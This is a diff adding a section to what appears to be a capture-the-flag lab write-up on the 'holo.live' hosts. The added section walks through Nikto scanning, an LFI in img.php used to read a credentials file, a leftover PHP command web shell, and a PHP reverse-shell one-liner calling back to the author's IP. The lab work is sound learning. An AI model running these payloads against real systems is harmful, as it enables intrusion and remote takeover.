@@ -828,6 +828,68 @@ The fw command helps to filter false positive responses, that I don't know why, 
 
     -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges
 
+We can proceed to add the new two virtual host to our hosts file. Then I proceeded to scan the host with Nikto:
+
+    nikto  -h 10.200.95.33
+    - Nikto v2.5.0
+    ...
+    + /robots.txt: contains 21 entries which should be manually viewed.
+    ...
+
+Inspecting http://www.holo.live/robots.txt I found nothting, then I tried for the other sub-domains. dev is not found, but admmin reveals interesting information:
+
+    User-agent: *
+    Disallow: /var/www/admin/db.php
+    Disallow: /var/www/admin/dashboard.php
+    Disallow: /var/www/admin/supersecretdir/creds.txt
+
+Of course the access to the directory is forbidden.
+
+Insepcting the source code for the application I found an interesting url parameter used to load images: view-source:http://dev.holo.live/talents.php
+
+    ...
+    <img src="img.php?file=images/amelia.jpg" alt="Image" class="img-responsive">
+    ...
+The application is vulnerable to LFI, and we can exploit to get some sensitive data. Since we have already found a potential sensitive file that could disclosure important information, I tried to get this file:
+
+    http://dev.holo.live/img.php?file=/var/www/admin/supersecretdir/creds.txt
+
+The file is downloaded as img.php and inside we can filnd some credentials. I used the credentials to access the admin app. Once logged in we can see that there is nothing we can do in pratical, I mean no way to upload o inject a webshell. Again inspecting the souce of the page I found an interesting comment:
+
+    <!--                   //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
+
+This a PHP insturction, interesting enough has been commented using HTML, so It is rendered on the client side, indeed to use server side PHP comment. Let's try to check if there is already a webshell installed for us :):
+
+    http://admin.holo.live/dashboard.php?cmd=whoami
+
+The command is executed and the output returned to us:
+
+     <h4 class="card-title"> www-data
+     Visitors today</h4>
+
+We can get the OS version as well:
+
+    http://admin.holo.live/dashboard.php?cmd=cat%20/etc/*rel*
+
+     <h4 class="card-title"> DISTRIB_ID=Ubuntu
+    DISTRIB_RELEASE=18.04
+    DISTRIB_CODENAME=bionic
+    DISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"
+    NAME="Ubuntu"
+    VERSION="18.04.5 LTS (Bionic Beaver)"
+    ID=ubuntu
+    ...
+
+Futher enumerations reveals that python is not installed, indeed PHP is 7.2.24, then I tried a PHP reverse shell:
+
+    http://admin.holo.live/dashboard.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1234%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
+
+For sake of learning this is the decoded command used
+
+    php -r '$sock=fsockopen("10.50.74.35",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+The IP refers to my tun0 interface, of course
+
 
     
 
